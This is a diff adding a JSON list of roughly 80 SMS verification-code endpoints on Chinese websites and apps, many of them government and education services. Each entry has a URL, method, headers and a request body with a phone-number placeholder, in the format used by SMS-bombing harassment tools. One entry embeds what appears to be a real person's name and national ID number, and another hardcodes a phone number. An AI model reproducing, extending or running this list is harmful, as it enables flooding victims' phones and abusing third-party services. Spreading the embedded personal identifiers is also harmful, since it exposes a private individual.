@@ -1,0 +1,555 @@
+[
+  {
+    "desc": "\u5f69\u4e91\u5c0f\u8bd1",
+    "url": "https://biz.caiyunapp.com/v1/send_sms_code",
+    "method": "POST",
+    "header": "{'Referer': 'https://fanyi.caiyunapp.com/', 'Cy-Token': 'token 9876032166'}",
+    "data": "{'phone_num': '[phone]', 'area_code': '86'}"
+  },
+  {
+    "desc": "\u7f51\u6613\u4e91\u6e38\u620f",
+    "url": "https://n.cg.163.com/api/v1/phone-captchas/86-[phone]",
+    "method": "POST",
+    "header": "",
+    "data": "{'etc': {'validate': ''}}"
+  },
+  {
+    "desc": "\u679c\u58f3app",
+    "url": "https://guokrapp-apis.guokr.com/hawking/v1/verifications",
+    "method": "POST",
+    "header": "{'User-Agent': 'android 2.0.15', 'Client-Source': 'android;23;Android;MuMu', 'Client-Channel': 'gkchannel_QD009', 'Content-Type': 'application/json; charset=UTF-8'}",
+    "data": "{'dial_code': '0086', 'phone': '[phone]'}"
+  },
+  {
+    "desc": "\u8e22\u7c73app",
+    "url": "https://www.timing360.com/user/send-captcha",
+    "method": "POST",
+    "header": "{'Authorization': '7119181942667E7D85987C65A6D0B8EC', 'Content-Type': 'application/x-www-form-urlencoded'}",
+    "data": "_app_version=10.13.2&_carrier=&_city=&_country=&_country_code=&_date=2022-04-05&_device_id=b6ad5aabe403d839&_device_manufacturer=Netease&_device_model=MuMu&_device_os=Android&_device_os_version=6.0.1&_distinct_id=a86d6bb7-8e26-43c5-baf3-82cdf95fffdd&_ip=&_is_login_id=0&_login_method=phone&_network_type=WIFI&_province=&_screen_height=2000&_screen_width=1125&_time=2022-04-05%2021%3A21%3A13&_user_id=a86d6bb7-8e26-43c5-baf3-82cdf95fffdd&_wifi=1&adCode=&brand=Android&city=&cityCode=&countryCode=86&imei=861151055733959&isCheckPhoneExist=0&latitude=&longitude=&market=yyb&nonce=708380&os=6.0.1&osType=1&phoneModel=MuMu&phoneNumber=[phone]&sessionId=e1c69361-c78b-4f4d-8c98-938ba4eccff6\u00d7tamp=[timestamp]&userID=-709178027&userKey=11111111111111111111111111111111&versioncode=187"
+  },
+  {
+    "desc": "\u5fae\u7231app",
+    "url": "http://api.welove520.com/v5/account/phone/verifyCode/send?phone_number=[phone]&client_id=464847866_[timestamp]&type=6&area_code=86&app_key=ac5f34563a4344c4&sig=xvP64W04tR%2FNJoZEJEoJySmlIXU%3D",
+    "method": "POST",
+    "header": "",
+    "data": ""
+  },
+  {
+    "desc": "\u8fd4\u5229app(24\u5c0f\u65f6\u9650\u5236)",
+    "url": "https://passport.fanli.com/mobileapi/i/user/mobileFastReg?jsoncallback=jQuery21105357980471043338_[timestamp]&mobile=[phone]&countrycode=86&mobilestep=1&_=[timestamp]",
+    "method": "GET",
+    "header": "",
+    "data": ""
+  },
+  {
+    "desc": "\u9177\u5b89(\u4e00\u5929\u53ea\u80fd\u4e00\u6b21)",
+    "url": "https://account.coolapk.com/auth/login?type=mobile",
+    "method": "POST",
+    "header": "",
+    "data": "submit=1&requestHash=c2592a6dr9x510&country=86&mobile=[phone]&captcha=&randomNumber=0undefined7952784010774208"
+  },
+  {
+    "desc": "\u5e7f\u4e1c\u9ad8\u8003\u62a5\u540dweb",
+    "url": "https://pg.eeagd.edu.cn/ks/public/kszc/zcyzm.jsmeb",
+    "method": "POST",
+    "header": "",
+    "data": "\"[phone]\""
+  },
+  {
+    "desc": "\u5e7f\u4e1c\u6559\u80b2\u7fd4\u4e91",
+    "url": "https://gl.gdedu.gov.cn/api-service/captcha?phoneNumber=[phone]&captchaType=QUERY_ADMIN",
+    "method": "GET",
+    "header": "",
+    "data": ""
+  },
+  {
+    "desc": "\u8fea\u5361\u4fac",
+    "url": "https://www.decathlon.com.cn/zh/ajax/rest/model/atg/userprofiling/ProfileActor/send-mobile-verification-code",
+    "method": "POST",
+    "header": "",
+    "data": "{'countryCode': 'CN', 'mobile': '[phone]'}"
+  },
+  {
+    "desc": "\u80a1\u6d77\u7f51",
+    "url": "https://www.guhai.com.cn/front/member/sendSmsCode",
+    "method": "POST",
+    "header": "",
+    "data": "{'mobile': '[phone]'}"
+  },
+  {
+    "desc": "LLL\u7684\u4e2a\u4ebablog",
+    "url": "http://www.lll.plus/sendCode/",
+    "method": "POST",
+    "header": "",
+    "data": "{'tel': '[phone]', 'forgetPwd': ''}"
+  },
+  {
+    "desc": "\u4f01\u7c73\u5b50",
+    "url": "https://www.xcxui.com/index/register/getcode.html",
+    "method": "POST",
+    "header": "",
+    "data": "{'tel': '[phone]'}"
+  },
+  {
+    "desc": "\u84b2\u516c\u82f1",
+    "url": "https://id.pgyer.com/user/getRegisterCode",
+    "method": "POST",
+    "header": "",
+    "data": "{'tel': '[phone]', 'callingCode': '86', 'mode': 'tel'}"
+  },
+  {
+    "desc": "\u767e\u5353\u4f18\u91c7",
+    "url": "https://erp.abiz.com/mobilecode/sendMobileCode",
+    "method": "POST",
+    "header": "",
+    "data": "{'mobile': '[phone]', 'captcha': ''}"
+  },
+  {
+    "desc": "\u4e91\u80cc\u7bd3",
+    "url": "https://brand.yunbeilou.com/index.php/smssend",
+    "method": "POST",
+    "header": "",
+    "data": "{'phone': '[phone]', 'v': 'yes'}"
+  },
+  {
+    "desc": "PHP\u4e2d\u6587\u7f51",
+    "url": "https://m.php.cn/account/phone_code.html",
+    "method": "POST",
+    "header": "",
+    "data": "{'phone': '[phone]'}"
+  },
+  {
+    "desc": "12321",
+    "url": "http://dhba.12321.cn/api/verifycode",
+    "method": "POST",
+    "header": "",
+    "data": "{'phone': '[phone]'}"
+  },
+  {
+    "desc": "Testin\u4f17\u6d4b",
+    "url": "https://www.ztestin.com/users/send/vercode",
+    "method": "POST",
+    "header": "",
+    "data": "{'phone': '[phone]', 'type': 'register', 'voice': '0'}"
+  },
+  {
+    "desc": "\u6d77\u5c14",
+    "url": "http://maker.haier.net/client/user/sendregistervcode.html",
+    "method": "POST",
+    "header": "",
+    "data": "{'account': '[phone]'}"
+  },
+  {
+    "desc": "\u98de\u732b\u4e91",
+    "url": "https://www.feimaoyun.com/index.php/invite/h5sendmsg",
+    "method": "POST",
+    "header": "",
+    "data": "{'pcode': '+86', 'phone': '[phone]'}"
+  },
+  {
+    "desc": "\u534e\u89c9\u6570\u5b57\u5316\u5e73\u53f0",
+    "url": "https://end.huajuetech.com/api/sendCode",
+    "method": "POST",
+    "header": "",
+    "data": "{'mobile': '[phone]', 'email': 'null', 'verfy_method': 'mobile'}"
+  },
+  {
+    "desc": "\u95ee\u653f\u6c5f\u897f",
+    "url": "https://wenz.jxnews.com.cn/ms/index.php/Home/User/get_yzm",
+    "method": "POST",
+    "header": "",
+    "data": "{'phone': '[phone]'}"
+  },
+  {
+    "desc": "\u6cb3\u5357\u667a\u6167\u515a\u5efa",
+    "url": "http://api.hndyjyfw.gov.cn/djapi/mobileVerify",
+    "method": "POST",
+    "header": "",
+    "data": "{'phone': '[phone]', 'verifytype': '1'}"
+  },
+  {
+    "desc": "\u9646\u9646\u9646\u4e91\u5b89\u5168",
+    "url": "https://cloud.666idc.com/index/login/sendsms.html",
+    "method": "POST",
+    "header": "",
+    "data": "{'mobile': '[phone]', 'mobile_pre': '86'}"
+  },
+  {
+    "desc": "\u7f51\u6613",
+    "url": "https://dz.blizzard.cn/action/user/mobile/captcha",
+    "method": "POST",
+    "header": "",
+    "data": "{'mobile': '[phone]'}"
+  },
+  {
+    "desc": "\u7801\u4e91\u793e",
+    "url": "https://www.codeseeding.com/loginUser/toSend",
+    "method": "POST",
+    "header": "",
+    "data": "{'phone': '[phone]'}"
+  },
+  {
+    "desc": "\u4eba\u624d\u5c71\u4e1c",
+    "url": "http://sso.rcsd.cn/regist/getVerifyCode",
+    "method": "POST",
+    "header": "",
+    "data": "{'personcall': '[phone]'}"
+  },
+  {
+    "desc": "\u6c34\u5229\u90e8",
+    "url": "http://sso.mwr.cn/suserRegister/verifyAccountAndphone.action",
+    "method": "POST",
+    "header": "",
+    "data": "{'mobile': '[phone]'}"
+  },
+  {
+    "desc": "\u4e03\u8054\u5927\u5b66",
+    "url": "http://ut7.whu.edu.cn/Home/studentCommon/Student_getVerifyCode",
+    "method": "POST",
+    "header": "",
+    "data": "{'phoneNumber': '[phone]', 'sendType': '0'}"
+  },
+  {
+    "desc": "\u95ea\u5fb7\u8d44\u8baf",
+    "url": "https://www.0101ssd.com/user/sendmsg",
+    "method": "POST",
+    "header": "",
+    "data": "{'mobile': '[phone]', 'event': 'register'}"
+  },
+  {
+    "desc": "\u6c5f\u82cf\u7701\u540d\u5e08\u7a7a\u4e2d\u8bfe\u5802",
+    "url": "https://mskzkt.jse.edu.cn/baseApi/user/code/",
+    "method": "POST",
+    "header": "",
+    "data": "{'mobile': '[phone]', 'type': '1'}"
+  },
+  {
+    "desc": "CSFF\u77ed\u7247",
+    "url": "https://csff.cutv.com/wapi/users/sendregcode",
+    "method": "POST",
+    "header": "",
+    "data": "{'telphone': '[phone]'}"
+  },
+  {
+    "desc": "\u5e7f\u897f\u4eba\u793e\u5385",
+    "url": "http://rswb.gx12333.net/member/getRegisterphoneCode.jspx",
+    "method": "POST",
+    "header": "",
+    "data": "{'aae005': '[phone]', 'aac003': '\u5218\u840c\u840c', 'aac002': '210212198506035924', 'notkeyflag': '1'}"
+  },
+  {
+    "desc": "\u9ea6\u514b\u8d5b\u5c14\u6570\u5b57\u6620\u50cf",
+    "url": "https://www.maxell-dm.cn/Code/CheckImage.aspx",
+    "method": "POST",
+    "header": "",
+    "data": "{'action': 'send', 'txtMember_Name': '[phone]'}"
+  },
+  {
+    "desc": "\u5b9d\u63d0\u5206",
+    "url": "http://main.jiajiaozaixian.com//reginfo/sendRankByMobileReginfo.action",
+    "method": "POST",
+    "header": "",
+    "data": "{'mobile': '[phone]'}"
+  },
+  {
+    "desc": "\u9009\u578b\u7cfb\u7edf",
+    "url": "http://www.cnppump.ltd/Service/UserHandler.ashx",
+    "method": "GET",
+    "header": "",
+    "data": "{'cmd': 'GetTelVerifyCode', 'Tel': '[phone]'}"
+  },
+  {
+    "desc": "\u5343\u91cc\u9a6c\u7f51\u4fe1\u79d1\u6280",
+    "url": "http://vip.qianlima.com/rest/u/api/user/register/mobile/code",
+    "method": "POST",
+    "header": "",
+    "data": "{'tips': '1', 'shouji': '[phone]'}"
+  },
+  {
+    "desc": "\u4fdd\u5b9a\u4e91",
+    "url": "https://baodingyun.com.cn/register/send_registerSMS.html",
+    "method": "POST",
+    "header": "",
+    "data": "{'phone': '[phone]'}"
+  },
+  {
+    "desc": "\u6b22\u52a8\u6e38\u620f",
+    "url": "http://www.gm5.com/auth/registerSms.html",
+    "method": "POST",
+    "header": "",
+    "data": "{'mobile': '[phone]'}"
+  },
+  {
+    "desc": "\u8fc8\u5a01",
+    "url": "https://www.maiwe.com.cn/index/sendcode.html",
+    "method": "GET",
+    "header": "",
+    "data": "{'tel': '[phone]'}"
+  },
+  {
+    "desc": "\u61a8\u9f20\u793e\u533a",
+    "url": "https://www.dehua.net/include/ajax.php?service=siteConfig&action=getphoneVerify&type=signup&phone=[phone]&areaCode=86",
+    "method": "GET",
+    "header": "",
+    "data": "{}"
+  },
+  {
+    "desc": "\u5929\u9e45\u5230\u5bb6",
+    "url": "https://user.daojia.com/mobile/getcode?mobile=[phone]&newVersion=1&bu=112",
+    "method": "GET",
+    "header": "",
+    "data": "{}"
+  },
+  {
+    "desc": "\u8bfa\u8fbe\u7b51\u5de5",
+    "url": "http://ks.ndzhugong.com/getVerificationCode?phone=[phone]&password=&smscode=",
+    "method": "GET",
+    "header": "",
+    "data": "{}"
+  },
+  {
+    "desc": "\u680b\u624d\u667a\u6167",
+    "url": "http://211.149.170.226:8201/dczp-cloud-client/rrs/user/sendSms?[phone]&[phone]&smsMode=2",
+    "method": "GET",
+    "header": "",
+    "data": "{}"
+  },
+  {
+    "desc": "\u5de5\u4f24\u9884\u9632\u7f51\u4e0a\u57f9\u8bad\u5e73\u53f0",
+    "url": "http://wf.zhuanjipx.com:8084//api-user/zjUsersPersonal/getSmsCode?mobile=[phone]&mobileCodeId=a87c9338-43a1-66ea-8ce7-1b1ac7c39d69",
+    "method": "GET",
+    "header": "",
+    "data": "{}"
+  },
+  {
+    "desc": "\u6d4e\u5b81\u4e13\u6280",
+    "url": "https://sdjn-web.yxlearning.com/sendphoneCode.gson",
+    "method": "POST",
+    "header": "",
+    "data": "{'phone': '[phone]', 'sendType': '4'}"
+  },
+  {
+    "desc": "\u5b81\u590f\u4f0a\u5730\u5730\u8d28\u5de5\u7a0b\u6709\u9650\u516c\u53f8",
+    "url": "http://www.yddzgc.com/bid-app/api/sys/code?phone=[phone]&type=1",
+    "method": "GET",
+    "header": "",
+    "data": "{}"
+  },
+  {
+    "desc": "\u9752\u6625\u5927\u5b66\u8bf4",
+    "url": "http://zycp.qcdxs.com:5001/sms/sendsms",
+    "method": "POST",
+    "header": "",
+    "data": "{'phone_number': '[phone]'}"
+  },
+  {
+    "desc": "\u5174\u4e1a\u5229\u8fbe\u7535\u5b50\u62db\u6295\u6807\u5e73\u53f0",
+    "url": "https://api.gzxyld.cn/HuiEbid/HuiEbidServer/doSendSms/getSms",
+    "method": "POST",
+    "header": "",
+    "data": "{'username': '[phone]', 'type': 'regUser', 'mobile': 'PC'}"
+  },
+  {
+    "desc": "\u706b\u8c61",
+    "url": "https://v1.alphazone-data.cn/academy/api/v1/sendsms",
+    "method": "POST",
+    "header": "",
+    "data": "{'temp': '1', 'phone': '[phone]'}"
+  },
+  {
+    "desc": "\u4e2d\u79d1\u6559\u80b2",
+    "url": "https://www.vipexam.cn/user/identifyingCode.action",
+    "method": "POST",
+    "header": "",
+    "data": "{'phone': '[phone]'}"
+  },
+  {
+    "desc": "\u805a\u9898\u5e93",
+    "url": "https://uc.csdhe.com/v1/sms/send?mobile=[phone]&apptype=examWeb",
+    "method": "GET",
+    "header": "",
+    "data": "{}"
+  },
+  {
+    "desc": "\u82cf\u5dde\u9ad8\u65b0\u533a\u6559\u80b2\u5c40",
+    "url": "https://jssnd.edu.cn/apiu/v1/register/auth",
+    "method": "POST",
+    "header": "",
+    "data": "{'phone': '[phone]'}"
+  },
+  {
+    "desc": "\u4e13\u4e1a\u6280\u672f\u4eba\u5458\u7ee7\u7eed\u6559\u80b2\u5e73\u53f0",
+    "url": "http://zhuanjipx.com:8082//api-user/zjUsersPersonal/getSmsCode?mobile=[phone]&mobileCodeId=685110c6-cef4-bb01-8f4d-19ea89f4d3f8",
+    "method": "GET",
+    "header": "",
+    "data": "{}"
+  },
+  {
+    "desc": "\u6cf0\u5b89\u4e13\u6280",
+    "url": "https://sdta-web.yxlearning.com/sendphoneCode.gson",
+    "method": "POST",
+    "header": "",
+    "data": "{'phone': '[phone]', 'sendType': '4'}"
+  },
+  {
+    "desc": "\u6f0f\u6d1e\u94f6\u884c",
+    "url": "https://www.bugbank.cn/api/verifymobile",
+    "method": "POST",
+    "header": "",
+    "data": "{'mobile': '[phone]'}"
+  },
+  {
+    "desc": "\u4e2d\u56fd\u52b3\u52a8\u4fdd\u969c\u65b0\u95fb\u7f51",
+    "url": "https://www.clssn.com/jhxtapi/web/Login/sendSmsCode",
+    "method": "POST",
+    "header": "",
+    "data": "{'mobile': '[phone]'}"
+  },
+  {
+    "desc": "\u5e7f\u4e1c\u7701\u5fc3\u7406\u5b66\u4f1a",
+    "url": "http://gpa-gd.scnu.edu.cn/member/index/public_send_code.html",
+    "method": "POST",
+    "header": "",
+    "data": "{'phone': '[phone]'}"
+  },
+  {
+    "desc": "\u8d39\u8018\u7f51",
+    "url": "https://www.feeclouds.com/homepage/register/send",
+    "method": "POST",
+    "header": "",
+    "data": "{'mobile': '[phone]'}"
+  },
+  {
+    "desc": "\u8bed\u96c0web",
+    "url": "https://www.yuque.com/api/validation_codes",
+    "method": "POST",
+    "header": "{'referer': 'https://www.yuque.com/register'}",
+    "data": "{'target': '[phone]', 'action': 'register', 'channel': 'sms'}"
+  },
+  {
+    "desc": "\u751c\u7cd6app",
+    "url": "http://tiantang.mogencloud.com/web/api/login/code?phone=[phone]",
+    "method": "POST",
+    "header": null,
+    "data": null
+  },
+  {
+    "desc": "\u7f51\u5fc3\u4e91APP",
+    "url": "https://account-box.onethingpcs.com/xluser.core.login/v3/sendsms",
+    "method": "POST",
+    "header": null,
+    "data": "{\"protocolVersion\":\"301\",\"sequenceNo\":\"1000001\",\"platformVersion\":\"10\",\"isCompressed\":\"0\",\"appid\":\"22017\",\"clientVersion\":\"3.15.1\",\"peerID\":\"00000000000000000000000000000000\",\"appName\":\"ANDROID-com.onethingcloud.android\",\"sdkVersion\":\"204500\",\"devicesign\":\"div101.095893e2bfa13a199f83691076c8bbb9ab0d01f75c929975048142c2fa38402b\",\"netWorkType\":\"WIFI\",\"providerName\":\"NONE\",\"deviceModel\":\"M2102J2SC\",\"deviceName\":\"Xiaomi M2102j2sc\",\"OSVersion\":\"11\",\"creditkey\":\"\",\"hl\":\"zh-CN\",\"mobile\":\"[phone]\",\"register\":\"0\"}"
+  },
+  {
+    "desc": "\u4e50\u6559\u4e50\u5b66",
+    "url": "http://id.lejiaolexue.com/api/sendvericode.ashx?phone=[phone]",
+    "method": "GET",
+    "header": null,
+    "data": null
+  },
+  {
+    "desc": "\u4e91\u674fHIS\u7cfb\u7edf(\u4e5d\u660e\u73e0)",
+    "url": "http://www.yhis999.cn/yunhis/register.do?act=lable&type=yzm",
+    "method": "POST",
+    "header": null,
+    "data": "{'lxdh': [phone]}"
+  },
+  {
+    "desc": "\u79d8\u5854\u5199\u4f5c",
+    "url": "https://xiezuocat.com/verify?type=signup",
+    "method": "POST",
+    "header": null,
+    "data": "{\"phone\": \"86-[phone]\"}"
+  },
+  {
+    "desc": "CNMO \u7f51\u7ad9",
+    "url": "http://passport.cnmo.com/index.php?c=Member_Ajax_Register&m=SendMessageCode&Jsoncallback=jQuery18306147606011785998_[timestamp]&mobile=[phone]&type=5&_=[timestamp]",
+    "method": "POST",
+    "header": null,
+    "data": null
+  },
+  {
+    "desc": "DR\u94bb\u6212web",
+    "url": "https://elove.darryring.com/api/crm/newGwLogin/getSMSValidCode?phone=[phone]&type=login",
+    "method": "GET",
+    "header": null,
+    "data": null
+  },
+  {
+    "desc": "\u6709\u4eab\u4e91\u5546web",
+    "url": "https://mallapi.yofogo.com/biz-mall-application/v1/user/verifyCode/getVerifyCode?phone=[phone]&descriptionType=1&codeType=2",
+    "method": "GET",
+    "header": null,
+    "data": null
+  },
+  {
+    "desc": "\u7814\u624d\u6559\u80b2app",
+    "url": "https://mall.yancais.com/api/sms/send?phone=[phone]",
+    "method": "GET",
+    "header": null,
+    "data": null
+  },
+  {
+    "desc": "\u6210\u5353\u79d1\u6280",
+    "url": "https://callphone.hnczkj.cn/app_api/json/sendSms",
+    "method": "POST",
+    "header": null,
+    "data": "{\"phone\": \"[phone]\",\"product\": \"biyingdianhua_ios\",\"key\": \"mwoe093fwef\"}"
+  },
+  {
+    "desc": "\u52a0\u5bc6\u7535\u8bdd",
+    "url": "https://m.4009991000.com/valNumQry.action",
+    "method": "POST",
+    "header": null,
+    "data": "{\"appType\":\"1\",\"app_id\":\"5555\",\"mobileNo\":\"[phone]\",\"sig\":\"16cd52ea74f5ea4a6c2fe80b9a04f8b5\",\"src\":\"1\",\"v\":\"4.9.2\",\"validType\":\"3\"}"
+  },
+  {
+    "desc": "\u5feb\u5e94\u7528\u7f8e\u62bd",
+    "url": "http://users.seeyouyima.com/xiaomi/connect/?action=getCaptcha&v=2.1.0&app_id=11&platform=7&myclient=1172100000&account=[phone]",
+    "method": "POST",
+    "header": null,
+    "data": null
+  },
+  {
+    "desc": "\u5c0f\u53f6\u5b50app",
+    "url": "https://dss.xiaoyezi.com/student_app/auth/validate_code?mobile=[phone]&country_code=86",
+    "method": "GET",
+    "header": null,
+    "data": null
+  },
+  {
+    "desc": "\u7259e\u5728\u7ebf",
+    "url": "https://yae920.com/login/sendSMS?mobile=[phone]&smsType=02&timestamp=[timestamp]",
+    "method": "POST",
+    "header": null,
+    "data": "mobile=[phone]&smsType=02&timestamp=[timestamp]"
+  },
+  {
+    "desc": "\u67d0\u6570\u56fe\u8868web(\u5b58\u7591)",
+    "url": "https://dycharts.com/vis/auth/send_signin_sms_code",
+    "method": "POST",
+    "header": null,
+    "data": "{'phoneNo':'13809213237'}"
+  },
+  {
+    "desc": "17k\u5c0f\u8bf4\u7f51app",
+    "url": "http://api.17k.com/user/mobile/[phone]/message?smsType=2&deviceFlag=64e538d8f0cff7bb107dd8c1fba0f5a2&cpsOpid=17Kxiaomi&_filterData=1&device_id=e0c0b30933e42492&channel=0&_versions=1280&merchant=17Kxiaomi&ua=Mozilla%2F5.0%20%28Linux%3B%20Android%2011%3B%20M2102J2SC%20Build%2FRKQ1.200826.002%3B%20wv%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Version%2F4.0%20Chrome%2F100.0.4896.127%20Mobile%20Safari%2F537.36&platform=2&manufacturer=Xiaomi&clientType=1&width=1080&appKey=4037465544&model=M2102J2SC&cpsSource=0&brand=Xiaomi&youthModel=0&height=2206",
+    "method": "GET",
+    "header": null,
+    "data": null
+  },
+  {
+    "desc": "\u6c47\u770b\u70b9\u5feb\u5e94\u7528",
+    "url": "https://grzx.brily.cn/api/utils/sendSmsCode?phone=[phone]&type=USER_REG",
+    "method": "POST",
+    "header": null,
+    "data": null
+  },
+  {
+    "desc": "\u6838\u6843\u7f16\u7a0bapp",
+    "url": "https://api.hetao101.com/login/v2/account/oauth/verifyCode?phoneNumber=[phone]",
+    "method": "GET",
+    "header": null,
+    "data": null
+  }
+]
